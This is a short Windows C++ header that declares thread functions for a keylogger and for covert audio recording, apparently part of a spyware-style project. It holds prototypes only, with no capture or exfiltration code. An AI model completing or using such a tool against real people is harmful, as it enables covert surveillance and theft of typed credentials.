#ifndef KEYLOGGER_THREAD_HPP
#define KEYLOGGER_THREAD_HPP

#include <iostream>
#include <windows.h>

DWORD WINAPI keyloggerThreadFunction(LPVOID windowsPointerParams);
DWORD WINAPI threadEnregistrementAudio(LPVOID windowsPointerParams);
void beginKeyloggerThread(HANDLE &thread, LPDWORD &threadId);
void beginAudioRecording(HANDLE &thread, LPDWORD &threadId);

#endif